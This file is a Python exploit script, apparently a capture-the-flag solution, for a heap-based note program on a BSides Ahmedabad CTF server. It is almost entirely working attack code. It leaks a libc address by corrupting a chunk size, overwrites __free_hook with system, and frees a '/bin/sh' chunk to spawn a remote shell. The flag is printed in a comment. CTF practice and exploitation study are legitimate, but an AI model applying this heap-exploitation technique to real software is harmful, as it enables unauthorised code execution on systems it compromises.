#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'pwn.bsidesahmedabad.in', 'port':9003})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.31.so')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_free_hook   = libc.symbols['__free_hook']
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    pn = PadNote(conn)

    pn.create(0, 0x18,  'a'*0x8)
    pn.create(1, 0x418, 'b'*0x8)
    pn.create(2, 0x18,  'c'*0x8)

    pn.delete(1)
    pn.edit(0, 0x18, 0x7fffffff, p64(0x423))
    pn.create(1, 0x418, 'B'*0x8)

    addr_libc_mainarena = u64(pn.show(1)[8:8+8]) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system        = libc.sep_function['system']

    pn.create(3, 0x21000,  '/bin/sh')
    pn.edit(3, 0x21ff0+offset_libc_free_hook, 0x7fffffff, p64(addr_libc_system))
    pn.delete(3)

class PadNote:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def create(self, idx, size, content):
        self.sendlineafter('Choice: ', '1')
        self.sendlineafter('Index: ', str(idx))
        self.sendlineafter('Size: ', str(size))
        self.sendafter('Content: ', content)
        if len(content) < size-1:
            self.sendline('')

    def edit(self, idx, ofs, cnt, content):
        self.sendlineafter('Choice: ', '2')
        self.sendlineafter('Index: ', str(idx))
        self.sendlineafter('Offset: ', str(ofs))
        self.sendlineafter('Count: ', str(cnt))
        self.sendafter('Content: ', content)
        if len(content) < cnt-1:
            self.sendline('')

    def show(self, idx):
        self.sendlineafter('Choice: ', '3')
        self.sendlineafter('Index: ', str(idx))
        self.recvuntil('Content: ')
        content = self.recvuntil('\nChoice', drop=True)
        self.unrecv('Choice')
        return content

    def delete(self, idx):
        self.sendlineafter('Choice: ', '4')
        self.sendlineafter('Index: ', str(idx))

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # Neko{vuln3r4b1l1ty_1ntr0duc3d_by_c0mp1l3r_0pt1m1z4t10n}

if __name__=='__main__':
    main()

#==========
